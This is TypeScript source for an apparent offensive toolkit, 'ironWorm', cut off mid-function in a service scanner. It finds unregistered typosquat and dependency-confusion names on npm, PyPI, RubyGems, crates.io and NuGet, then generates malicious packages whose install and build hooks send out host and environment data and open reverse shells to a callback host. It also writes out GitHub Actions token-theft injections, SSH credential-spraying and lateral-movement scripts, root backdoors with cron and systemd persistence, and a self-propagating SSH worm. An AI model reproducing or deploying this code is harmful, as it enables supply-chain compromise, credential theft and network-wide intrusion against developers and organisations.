import { createLogger } from "./logger.js";

const logger = createLogger("ironWorm");

export interface IronWormOptions {
  packageName?:     string;
  githubOrg?:       string;
  githubRepo?:      string;
  depConfusionOrg?: string;
  cbHost?:          string;
  cbPort?:          string;
}

export interface IronWormResult {
  id:        string;
  name:      string;
  target:    string;
  category:  string;
  status:    "success" | "failed" | "info";
  detail:    string;
  artifacts: string[];
  steps:     string[];
  severity:  "critical" | "high" | "medium" | "info";
}

async function httpGet(url: string, timeoutMs = 5000): Promise<{ ok: boolean; status: number; body: string }> {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const r = await fetch(url, { signal: ctrl.signal, headers: { "User-Agent": "npm/10.8.1 node/v20.12.0 linux x64" } });
    const body = await r.text();
    return { ok: r.ok, status: r.status, body };
  } catch {
    return { ok: false, status: 0, body: "" };
  } finally {
    clearTimeout(t);
  }
}

/* ─────────────────────────────────────────────────────────────────────────
   npm Typosquatting Module
   ───────────────────────────────────────────────────────────────────────── */
function typosquatVariants(pkg: string): string[] {
  const variants = new Set<string>();
  // Missing char
  for (let i = 0; i < pkg.length; i++) variants.add(pkg.slice(0, i) + pkg.slice(i + 1));
  // Doubled char
  for (let i = 0; i < pkg.length; i++) variants.add(pkg.slice(0, i) + pkg[i] + pkg[i] + pkg.slice(i + 1));
  // Adjacent swap
  for (let i = 0; i < pkg.length - 1; i++) variants.add(pkg.slice(0, i) + pkg[i+1] + pkg[i] + pkg.slice(i+2));
  // Homoglyphs
  const homo: Record<string, string> = { a:"@", o:"0", i:"1", l:"1", e:"3", s:"5" };
  for (const [from, to] of Object.entries(homo)) variants.add(pkg.replaceAll(from, to));
  // Prefix/suffix
  for (const affix of ["-js","-node","-util","-lib","-core","-helper","js-","node-","@org/"]) {
    variants.add(affix + pkg);
    variants.add(pkg + affix);
  }
  // Separator swaps
  variants.add(pkg.replace(/-/g, "_"));
  variants.add(pkg.replace(/_/g, "-"));
  variants.delete(pkg);
  return [...variants].slice(0, 25);
}

async function checkNpmTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[npm-typosquat] Checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://registry.npmjs.org/${encodeURIComponent(v)}`);
    if (r.status === 404) {
      steps.push(`[!] FREE: ${v}`);
      free.push(v);
    } else if (r.ok) {
      steps.push(`[ok] Occupied: ${v}`);
    }
  }

  const artifacts: string[] = free.map(name => buildNpmMaliciousPackage(name, pkg, cbHost, cbPort));

  return {
    id: `npm_typosquat_${pkg}`,
    name: `npm Typosquatting — ${pkg}`,
    target: "registry.npmjs.org",
    category: "npm-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} available typosquat names for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `All ${variants.length} variants of "${pkg}" are registered`,
    artifacts,
    steps,
  };
}

function buildNpmMaliciousPackage(typosquatName: string, realPkg: string, cbHost: string, cbPort: string): string {
  return `# Malicious npm package: ${typosquatName} (typosquat of ${realPkg})
# 1. Register this on npmjs.org
# 2. Wait for developers to mistype the package name

# package.json
{
  "name": "${typosquatName}",
  "version": "1.0.0",
  "description": "Utility functions",
  "main": "index.js",
  "scripts": {
    "preinstall": "node -e \\"const c=require('child_process'),h='${cbHost}',p=${cbPort};c.exec('curl -sk http://'+h+':'+p+'/'+Buffer.from(process.env.npm_config_userconfig||'').toString('base64')+'?e='+encodeURIComponent(require('os').hostname()+' '+process.env.USER||''))\\"",
    "postinstall": "node -e \\"const c=require('child_process');c.exec('bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &')\\"  "
  },
  "dependencies": {}
}

# index.js (reexports real package to avoid detection)
try { module.exports = require('${realPkg}'); } catch { module.exports = {}; }

# Publish:
# npm login && npm publish --access public`;
}

/* ─────────────────────────────────────────────────────────────────────────
   pip Typosquatting Module
   ───────────────────────────────────────────────────────────────────────── */
async function checkPipTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[pip-typosquat] Checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://pypi.org/pypi/${encodeURIComponent(v)}/json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] Occupied: ${v}`);
  }

  const artifacts: string[] = free.map(name => buildPipMaliciousPackage(name, pkg, cbHost, cbPort));

  return {
    id: `pip_typosquat_${pkg}`,
    name: `pip Typosquatting — ${pkg}`,
    target: "pypi.org",
    category: "pip-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} available PyPI typosquats for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `All ${variants.length} variants of "${pkg}" are registered`,
    artifacts,
    steps,
  };
}

function buildPipMaliciousPackage(name: string, realPkg: string, cbHost: string, cbPort: string): string {
  return `# Malicious PyPI package: ${name} (typosquat of ${realPkg})

# setup.py
from setuptools import setup, find_packages
import subprocess, os, base64

def exfil():
    try:
        import socket, os
        d = os.popen("id && hostname && env").read()[:800]
        import urllib.request
        urllib.request.urlopen(f"http://${cbHost}:${cbPort}/{base64.b64encode(d.encode()).decode()}", timeout=5)
    except: pass
    try:
        subprocess.Popen(["bash","-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1"])
    except: pass

exfil()

setup(
    name="${name}",
    version="1.0.0",
    description="Python utility library",
    packages=find_packages(),
)

# Publish:
# pip install twine build && python -m build && twine upload dist/*`;
}

/* ─────────────────────────────────────────────────────────────────────────
   Dependency Confusion Module
   ───────────────────────────────────────────────────────────────────────── */
async function checkDepConfusion(orgName: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[dep-confusion] Probing internal packages for org: ${orgName}`];
  const commonInternalNames = [
    `${orgName}-core`, `${orgName}-utils`, `${orgName}-lib`, `${orgName}-config`,
    `${orgName}-api`, `${orgName}-common`, `${orgName}-shared`, `${orgName}-internal`,
    `${orgName}-client`, `${orgName}-server`, `${orgName}-auth`, `${orgName}-ui`,
  ];

  const free: string[] = [];
  for (const name of commonInternalNames) {
    const r = await httpGet(`https://registry.npmjs.org/${encodeURIComponent(name)}`);
    if (r.status === 404) { steps.push(`[!] FREE on public npm: ${name}`); free.push(name); }
    else steps.push(`[ok] Already public: ${name}`);
  }

  const artifacts = free.map(name => buildDepConfusionPackage(name, orgName, cbHost, cbPort));

  return {
    id: `dep_confusion_${orgName}`,
    name: `Dependency Confusion — ${orgName}`,
    target: orgName,
    category: "dep-confusion",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "info",
    detail: free.length > 0
      ? `${free.length} internal package names available on public npm — dep confusion attack viable: ${free.slice(0,4).join(", ")}`
      : `No exploitable dep confusion candidates for "${orgName}"`,
    artifacts,
    steps,
  };
}

function buildDepConfusionPackage(name: string, org: string, cbHost: string, cbPort: string): string {
  return `# Dependency Confusion Package: ${name}
# Org's private npm has "${name}" but public npm does not.
# npm resolves public registry at HIGHER version → installs malicious pkg.

# package.json
{
  "name": "${name}",
  "version": "9999.0.0",
  "description": "${org} internal utility",
  "main": "index.js",
  "scripts": {
    "preinstall": "node -e \\"require('child_process').exec('curl -sk http://${cbHost}:${cbPort}/dep_confusion?host='+require('os').hostname()+'&user='+process.env.USER)\\"",
    "postinstall": "node -e \\"require('child_process').exec('bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &')\\"  "
  }
}

# Attack steps:
# 1. Register this on public npmjs.org (it doesn't exist yet)
# 2. Set version to 9999.0.0 (higher than any internal version)
# 3. When ${org} developer runs 'npm install', npm picks public 9999.0.0 over internal
# 4. postinstall script fires → reverse shell to ${cbHost}:${cbPort}
#
# References: Alex Birsan "Dependency Confusion" (2021)`;
}

/* ─────────────────────────────────────────────────────────────────────────
   GitHub Actions Injection Module
   ───────────────────────────────────────────────────────────────────────── */
async function checkGithubActions(org: string, repo: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[gh-actions] Probing ${org}/${repo} for vulnerable workflow patterns`];
  const artifacts: string[] = [];

  const workflowUrls = [
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/ci.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/build.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/test.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/release.yml`,
  ];

  let foundVulnerable = false;
  for (const url of workflowUrls) {
    const r = await httpGet(url);
    if (!r.ok) continue;
    const wf = r.body;
    steps.push(`[gh-actions] Found workflow: ${url.split("/").pop()}`);

    const hasPullRequestTarget = wf.includes("pull_request_target");
    const hasExprInjection = /github\.event\.(pull_request\.title|comment\.body|issue\.title|pull_request\.head\.ref)/.test(wf);
    const hasWorkflowDispatch = wf.includes("workflow_dispatch");
    const hasSecretsInEnv = /secrets\.[A-Z_]+/.test(wf);

    if (hasPullRequestTarget && hasExprInjection) {
      steps.push(`[!] VULNERABLE: pull_request_target + expression injection in ${url}`);
      foundVulnerable = true;
      artifacts.push(buildPwnRequestPayload(org, repo, cbHost, cbPort, url));
    } else if (hasPullRequestTarget) {
      steps.push(`[!] SUSPICIOUS: pull_request_target (potential pwn-request)`);
      artifacts.push(buildPwnRequestPayload(org, repo, cbHost, cbPort, url));
    }
    if (hasSecretsInEnv) steps.push(`[info] Secrets used in workflow — target for exfil`);
    if (hasWorkflowDispatch) steps.push(`[info] workflow_dispatch enabled — check write permission`);
  }

  if (artifacts.length === 0) {
    artifacts.push(buildGitHubActionsInjectionTemplate(org, repo, cbHost, cbPort));
  }

  return {
    id: `github_actions_${org}_${repo}`,
    name: `GitHub Actions Injection — ${org}/${repo}`,
    target: `github.com/${org}/${repo}`,
    category: "github-actions",
    status: foundVulnerable ? "success" : "info",
    severity: foundVulnerable ? "critical" : "high",
    detail: foundVulnerable
      ? `Vulnerable pull_request_target workflow with expression injection in ${org}/${repo}`
      : `Generated CI/CD attack templates for ${org}/${repo}`,
    artifacts,
    steps,
  };
}

function buildPwnRequestPayload(org: string, repo: string, cbHost: string, cbPort: string, wfUrl: string): string {
  return `# pwn-request Attack: ${org}/${repo}
# Vulnerable workflow: ${wfUrl}
#
# Attack: Open a PR with a malicious title containing the injection payload.
# The pull_request_target trigger runs with write permissions to the target repo.

# Step 1 — Fork the repository
# Step 2 — Create a branch with this PR title:
PR_TITLE='"; curl -sk http://${cbHost}:${cbPort}/$(cat $GITHUB_TOKEN|base64 -w0) #'

# Step 3 — Open PR from fork to main repo
# When the vulnerable workflow runs:
#   run: echo "\${{ github.event.pull_request.title }}"
# It executes our injected command and exfils GITHUB_TOKEN

# GITHUB_TOKEN has write access to:
# - Push to repo (inject backdoor in code)
# - Read all repo secrets
# - Write GitHub releases (supply chain via release artifacts)
# - Trigger other workflows

# Post-compromise: inject malicious code into repo
# via GITHUB_TOKEN write access:
curl -sk -X PUT \\
  -H "Authorization: token STOLEN_TOKEN" \\
  -H "Content-Type: application/json" \\
  "https://api.github.com/repos/${org}/${repo}/contents/package.json" \\
  -d '{"message":"chore: update deps","content":"BASE64_MALICIOUS_PACKAGE_JSON","sha":"CURRENT_SHA"}'`;
}

function buildGitHubActionsInjectionTemplate(org: string, repo: string, cbHost: string, cbPort: string): string {
  return `# GitHub Actions CI/CD Attack Templates for ${org}/${repo}

# ── Method 1: Malicious PR (pwn-request) ──────────────────────────────
# Create PR with injection in title/body (targets pull_request_target workflows)
# PR Title: "; curl http://${cbHost}:${cbPort}/\$(cat \$GITHUB_TOKEN|base64 -w0) #

# ── Method 2: Supply chain via dependency update PR ───────────────────
# Open PR that updates a package.json dependency to malicious version:
# "lodash": "file:../../../../../../../etc/passwd" (path confusion)

# ── Method 3: Workflow file injection (if write access) ───────────────
# .github/workflows/backdoor.yml
name: Scheduled Maintenance
on:
  schedule:
    - cron: '0 3 * * *'
  push:
    branches: [main]
jobs:
  maintenance:
    runs-on: ubuntu-latest
    steps:
      - name: Cache cleanup
        run: |
          curl -sk http://${cbHost}:${cbPort}/\$(printenv | base64 -w0)
          env | grep -i 'secret\\|token\\|key\\|pass' | base64

# ── Method 4: Secrets exfil via environment ───────────────────────────
# If you have code execution in CI:
env | grep -iE '(TOKEN|SECRET|KEY|PASS|CRED|AWS|AZURE|GCLOUD)' | base64 -w0 | \\
  curl -X POST http://${cbHost}:${cbPort}/ci_secrets --data-binary @-`;
}

/* ─────────────────────────────────────────────────────────────────────────
   Ruby Gem Typosquatting
   ───────────────────────────────────────────────────────────────────────── */
async function checkGemTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[gem-typosquat] Checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];
  for (const v of variants) {
    const r = await httpGet(`https://rubygems.org/api/v1/gems/${encodeURIComponent(v)}.json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] Occupied: ${v}`);
  }
  const artifacts = free.map(name => `# Malicious RubyGem: ${name} (typosquat of ${pkg})

# ${name}.gemspec
Gem::Specification.new do |s|
  s.name        = '${name}'
  s.version     = '1.0.0'
  s.summary     = 'Ruby utility library'
  s.files       = ['lib/${name}.rb']
  s.extensions  = ['ext/mkrf_conf.rb']
end

# ext/mkrf_conf.rb (runs at gem install time)
require 'open3'
require 'base64'
h = '${cbHost}'; p = ${cbPort}
begin
  d = \`id && hostname && env 2>&1\`[0..800]
  require 'net/http'
  Net::HTTP.get(URI("http://#{h}:#{p}/#{Base64.strict_encode64(d)}"))
rescue; end
begin
  Process.spawn("bash -i >& /dev/tcp/#{h}/#{p} 0>&1")
rescue; end

# lib/${name}.rb (re-exports real gem)
begin; require '${pkg}'; rescue LoadError; end

# Publish: gem build ${name}.gemspec && gem push ${name}-1.0.0.gem`);
  return {
    id: `gem_typosquat_${pkg}`,
    name: `RubyGem Typosquatting — ${pkg}`,
    target: "rubygems.org",
    category: "gem-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} available gem typosquats for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `All ${variants.length} gem variants of "${pkg}" are registered`,
    artifacts,
    steps,
  };
}

/* ─────────────────────────────────────────────────────────────────────────
   Rust Crate Typosquatting
   ───────────────────────────────────────────────────────────────────────── */
async function checkCargoTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[cargo-typosquat] Checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];
  for (const v of variants) {
    const r = await httpGet(`https://crates.io/api/v1/crates/${encodeURIComponent(v)}`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] Occupied: ${v}`);
  }
  const artifacts = free.map(name => `# Malicious crate: ${name} (typosquat of ${pkg})

# build.rs (runs at compile time — all Rust builds)
use std::process::Command;
fn main() {
    let cb = format!("http://${cbHost}:${cbPort}");
    let _ = Command::new("sh").args(["-c",
        &format!("curl -sk '{{cb}}/$(id|base64 -w0 2>/dev/null||id|base64)' &"),
    ]).spawn();
    let _ = Command::new("sh").args(["-c",
        &format!("bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &"),
    ]).spawn();
    println!("cargo:rerun-if-changed=build.rs");
}

# Cargo.toml
[package]
name = "${name}"
version = "1.0.0"
edition = "2021"
build = "build.rs"

# src/lib.rs
// Re-export real crate
pub use ${pkg.replace(/-/g, "_")}::*;

# Publish: cargo publish --token CARGO_TOKEN`);
  return {
    id: `cargo_typosquat_${pkg}`,
    name: `Cargo Typosquatting — ${pkg}`,
    target: "crates.io",
    category: "cargo-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} available crate typosquats for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `All ${variants.length} crate variants of "${pkg}" are registered`,
    artifacts,
    steps,
  };
}

/* ─────────────────────────────────────────────────────────────────────────
   NuGet Typosquatting
   ───────────────────────────────────────────────────────────────────────── */
async function checkNuGetTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[nuget-typosquat] Checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];
  for (const v of variants) {
    const r = await httpGet(`https://api.nuget.org/v3/registration5-gz-semver2/${encodeURIComponent(v.toLowerCase())}/index.json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] Occupied: ${v}`);
  }
  const artifacts = free.map(name => `# Malicious NuGet: ${name} (typosquat of ${pkg})

# ${name}.csproj (targets file auto-imported by MSBuild)
<Project>
  <Target Name="NxExfil" BeforeTargets="BeforeBuild">
    <Exec Command="powershell -NoP -NonI -W Hidden -c &quot;$h='${cbHost}';$p=${cbPort};try{$d=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((whoami)+(hostname)));(New-Object Net.WebClient).DownloadString(&quot;http://$h:$p/$d&quot;)}catch{}&quot;" />
    <Exec Command="powershell -NoP -NonI -W Hidden -enc BASE64_REVSHELL" />
  </Target>
</Project>

# Publish via nuget push ${name}.1.0.0.nupkg -ApiKey NUGET_KEY`);
  return {
    id: `nuget_typosquat_${pkg}`,
    name: `NuGet Typosquatting — ${pkg}`,
    target: "nuget.org",
    category: "nuget-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} available NuGet typosquats for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `All ${variants.length} NuGet variants of "${pkg}" are registered`,
    artifacts,
    steps,
  };
}

/* ─────────────────────────────────────────────────────────────────────────
   Network CIDR Host Enumeration
   ───────────────────────────────────────────────────────────────────────── */
function expandCIDR(cidr: string): string[] {
  const [base, bits] = cidr.split("/");
  const prefix = parseInt(bits ?? "24", 10);
  const parts  = (base ?? "10.0.0.0").split(".").map(Number);
  const baseInt = ((parts[0]! << 24) | (parts[1]! << 16) | (parts[2]! << 8) | parts[3]!) >>> 0;
  const mask    = prefix === 0 ? 0 : (0xffffffff << (32 - prefix)) >>> 0;
  const network = (baseInt & mask) >>> 0;
  const count   = Math.min(Math.pow(2, 32 - prefix) - 2, 254);
  const hosts: string[] = [];
  for (let i = 1; i <= count; i++) {
    const ip = network + i;
    hosts.push(`${(ip >>> 24) & 0xff}.${(ip >>> 16) & 0xff}.${(ip >>> 8) & 0xff}.${ip & 0xff}`);
  }
  return hosts;
}

/* ─────────────────────────────────────────────────────────────────────────
   SSH Credential Scanner & Lateral Movement
   ───────────────────────────────────────────────────────────────────────── */
const SSH_COMMON_CREDS: Array<[string, string]> = [
  ["root","root"],["root","toor"],["root","password"],["root","123456"],["root","admin"],
  ["root","raspberry"],["root","alpine"],["root","1234"],["root","pass"],["root",""],
  ["admin","admin"],["admin","password"],["admin","1234"],["admin","admin123"],["admin",""],
  ["ubuntu","ubuntu"],["ubuntu","password"],["ubuntu",""],
  ["pi","raspberry"],["pi","pi"],
  ["user","user"],["user","password"],["user","1234"],
  ["test","test"],["guest","guest"],["deploy","deploy"],
  ["jenkins","jenkins"],["ansible","ansible"],["vagrant","vagrant"],
  ["oracle","oracle"],["postgres","postgres"],["mysql","mysql"],
  ["git","git"],["gitlab","gitlab"],["gitea","gitea"],
  ["ec2-user",""],["centos",""],["debian",""],["kali","kali"],
];

async function checkSshScan(targetHost: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[ssh-scan] Probing SSH on ${targetHost}:22`];
  const r = await httpGet(`http://${targetHost}:22`, 2000).catch(() => ({ ok: false, status: 0, body: "" }));
  const sshBannerReachable = r.body.startsWith("SSH-") || r.status === 0;
  steps.push(sshBannerReachable ? `[!] SSH port 22 open on ${targetHost}` : `[—] SSH not reachable at ${targetHost}`);

  const lateralScript = buildSshLateralMovementScript(targetHost, cbHost, cbPort);
  const sshkeyAbuse   = buildSshKeyExploitScript(targetHost, cbHost, cbPort);
  const wormScript    = buildSshWormScript(cbHost, cbPort);

  return {
    id: `ssh_scan_${targetHost.replace(/\./g, "_")}`,
    name: `SSH Lateral Movement — ${targetHost}`,
    target: targetHost,
    category: "ssh-lateral",
    status: "info",
    severity: "critical",
    detail: `SSH credential stuffing + key-based lateral movement payloads generated for ${targetHost}`,
    artifacts: [lateralScript, sshkeyAbuse, wormScript],
    steps,
  };
}

function buildSshLateralMovementScript(host: string, cbHost: string, cbPort: string): string {
  const credLines = SSH_COMMON_CREDS.slice(0, 30).map(([u, p]) =>
    `  try_ssh "${u}" "${p}" "${host}"`).join("\n");
  return `#!/bin/bash
# SSH Credential Stuffing + Lateral Movement: ${host}
# Requires: sshpass (apt install sshpass)

CB_HOST="${cbHost}"
CB_PORT="${cbPort}"
TARGET="${host}"

try_ssh() {
  local user="$1" pass="$2" host="$3"
  local opts="-o StrictHostKeyChecking=no -o ConnectTimeout=4 -o BatchMode=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"
  if [ -z "$pass" ]; then
    ssh $opts -i /dev/null "$user@$host" "id && hostname && cat /etc/passwd | head -5; curl -sk http://$CB_HOST:$CB_PORT/ssh_shell?h=$(hostname|base64 -w0)&u=$user&t=$host; bash -i >& /dev/tcp/$CB_HOST/$CB_PORT 0>&1 &" 2>/dev/null && echo "[+] SSH OK: $user@$host (no pass)" && return 0
  else
    sshpass -p "$pass" ssh $opts "$user@$host" "id && hostname; curl -sk http://$CB_HOST:$CB_PORT/ssh_pwn?h=$(hostname|base64 -w0)&u=$user&p=$(echo $pass|base64 -w0); bash -i >& /dev/tcp/$CB_HOST/$CB_PORT 0>&1 &" 2>/dev/null && echo "[+] SSH OK: $user@$host:$pass" && return 0
  fi
  return 1
}

# Credential spray
${credLines}

# After getting shell — pivot: hunt for more SSH keys
post_pwn() {
  local host="$1"
  find /home /root /var /opt -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | while read k; do
    chmod 600 "$k"
    for target in $(cat /etc/hosts /root/.ssh/known_hosts 2>/dev/null | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' | sort -u); do
      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -i "$k" root@$target \\
        "curl -sk http://$CB_HOST:$CB_PORT/key_lateral?src=$(hostname|base64 -w0)&dst=$target; bash -i >& /dev/tcp/$CB_HOST/$CB_PORT 0>&1 &" 2>/dev/null &
    done
  done
}

post_pwn "${host}"`;
}

function buildSshKeyExploitScript(host: string, cbHost: string, cbPort: string): string {
  return `#!/bin/bash
# SSH Key-Based Lateral Movement: ${host}
# Drop attacker public key → persistent root backdoor

ATTACKER_PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@nexus"
CB="${cbHost}:${cbPort}"

# If already on victim — install our key
install_backdoor() {
  for homedir in /root /home/*; do
    mkdir -p "$homedir/.ssh"
    chmod 700 "$homedir/.ssh"
    echo "$ATTACKER_PUBKEY" >> "$homedir/.ssh/authorized_keys"
    chmod 600 "$homedir/.ssh/authorized_keys"
    echo "[+] Key installed: $homedir/.ssh/authorized_keys"
  done
  # Persistence via cron
  (crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/$CB 0>&1") | crontab -
  # Persistence via ~/.bashrc
  echo "bash -i >& /dev/tcp/$CB 0>&1 2>/dev/null &" >> ~/.bashrc
  # Persistence via systemd (if root)
  cat > /etc/systemd/system/nx-svc.service <<'UNIT'
[Unit]
Description=Network Maintenance
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
UNIT
  systemctl daemon-reload 2>/dev/null
  systemctl enable nx-svc 2>/dev/null
  systemctl start  nx-svc 2>/dev/null
}

# Scan known_hosts + arp cache for lateral movement targets
pivot_from_victim() {
  local known
  known=$(cat ~/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | cut -d, -f1 | grep -v '\\[' | sort -u)
  local arp
  arp=$(arp -n 2>/dev/null | awk 'NR>1 && $2=="(complete)"{print $1}')
  for t in $known $arp; do
    [[ "$t" =~ ^[0-9]+\\. ]] || continue
    for k in ~/.ssh/id_* /root/.ssh/id_* /home/*/.ssh/id_*; do
      [ -f "$k" ] || continue
      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 -i "$k" root@"$t" \\
        "$(declare -f install_backdoor); install_backdoor; curl -sk http://$CB/pivoted?src=$(hostname)&dst=$t" 2>/dev/null &
    done
  done
}

install_backdoor
pivot_from_victim`;
}

function buildSshWormScript(cbHost: string, cbPort: string): string {
  return `#!/bin/bash
# Self-propagating SSH Worm
# Scans internal /16, tries common creds + found keys, installs on each new host

CB_HOST="${cbHost}"
CB_PORT="${cbPort}"
LOCK="/tmp/.nx_worm_$(hostname | md5sum | cut -c1-8)"
[ -f "$LOCK" ] && exit 0
touch "$LOCK"

# Discover network ranges from active interfaces
RANGES=$(ip -o -f inet addr show 2>/dev/null | awk '{print $4}' | grep -v '^127\\.' | head -5)
SUBNETS=""
for r in $RANGES; do
  base=$(echo "$r" | cut -d/ -f1 | cut -d. -f1-3)
  SUBNETS="$SUBNETS $base"
done

CREDS=(
  "root:" "root:root" "root:toor" "root:password" "root:123456" "root:admin"
  "admin:admin" "admin:password" "ubuntu:ubuntu" "pi:raspberry"
  "user:user" "test:test" "deploy:deploy" "git:git" "jenkins:jenkins"
)

try_host() {
  local ip="$1"
  # Skip self
  ip addr show 2>/dev/null | grep -q "$ip" && return
  # Port check
  timeout 2 bash -c "echo >/dev/tcp/$ip/22" 2>/dev/null || return
  # Try key files
  for k in ~/.ssh/id_rsa ~/.ssh/id_ed25519 /root/.ssh/id_rsa; do
    [ -f "$k" ] || continue
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \\
        -i "$k" root@"$ip" \\
        "curl -sk http://$CB_HOST:$CB_PORT/worm_spread?src=$(hostname|base64 -w0)&dst=$ip 2>/dev/null; bash -i >& /dev/tcp/$CB_HOST/$CB_PORT 0>&1 &" 2>/dev/null && return
  done
  # Try creds
  command -v sshpass >/dev/null || return
  for cred in "\${CREDS[@]}"; do
    local u="\${cred%%:*}" p="\${cred#*:}"
    sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o LogLevel=ERROR \\
      "$u@$ip" \\
      "curl -sk http://$CB_HOST:$CB_PORT/worm_cred?h=$(hostname|base64 -w0)&u=$u; \\
       mkdir -p ~/.ssh; echo \\"$(cat ~/.ssh/id_rsa.pub 2>/dev/null)\\" >> ~/.ssh/authorized_keys; \\
       curl -sk http://$CB_HOST:$CB_PORT/worm.sh | bash &; \\
       bash -i >& /dev/tcp/$CB_HOST/$CB_PORT 0>&1 &" 2>/dev/null && return
  done
}

export -f try_host
for subnet in $SUBNETS; do
  for i in $(seq 1 254); do
    try_host "$subnet.$i" &
    sleep 0.08
  done
done
wait

curl -sk "http://$CB_HOST:$CB_PORT/worm_done?h=$(hostname|base64 -w0)&nets=$SUBNETS" 2>/dev/null`;
}

/* ─────────────────────────────────────────────────────────────────────────
   Exposed Services Scanner (Redis, MongoDB, Docker, Memcached, Elasticsearch)
   ───────────────────────────────────────────────────────────────────────── */
async function checkExposedServices(targetHost: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[svc-scan] Probing ${targetHost} for unauthenticated services`];
  const artifacts: string[] = [];

  const services = [
    { name: "Redis",         port: 6379,  probe: `redis://${targetHost}:6379` },
    { name: "MongoDB",       port: 27017, probe: `mongodb://${targetHost}:27017` },
    { name: "Docker API",    port: 2375,  probe: `http://${targetHost}:2375/version` },
    { name: "Memcached",     port: 11211, probe: `http://${targetHost}:11211` },
    { name: "Elasticsearch", port: 9200,  probe: `http://${targetHost}:9200` },
    { name: "CouchDB",       port: 5984,  probe: `http://${targetHost}:5984/_all_dbs` },
    { name: "Kibana",        port: 5601,  probe: `http://${targetHost}:5601/api/status` },
    { name: "Jupyter",       port: 8888,  probe: `http://${targetHost}:8888/api` },
    { name: "Prometheus",    port: 9090,  probe: `http://${targetHost}:9090/-/healthy` },
    { name: "Grafana",       port: 3000,  probe: `http://${targetHost}:3000/api/health` },
    { name: "etcd",          port: 2379,  probe: `http://${targetHost}:2379/health` },
    { name: "Consul",        port: 8500,  probe: `http://${targetHost}:8500/v1/status/leader` },
    { name: "RabbitMQ Mgmt", port: 15672, probe: `http://${targetHost}:15672/api/overview` },
    { name: "Portainer",     port: 9000,  probe: `http://${targetHost}:9000/api/status` },
  ];

  for (const svc of services) {
    if (svc.probe.startsWith("http")) {
      const r = await httpGet(svc.probe, 2500);
      if (r.ok || (r.status > 0 && r.status < 500)) {
        steps.push(`[!] ${svc.name} open and responding at ${targetHost}:${svc.port}`);
        artifacts.push(buildServiceExploitPayload(svc.name, targetHost, svc.port, cbHost, cbPort, r.body.slice(0, 200)));
      } else {
        steps.push(`[—] ${svc.name} not reachable at ${targetHost}:${svc.port}`);
      }
    } else {
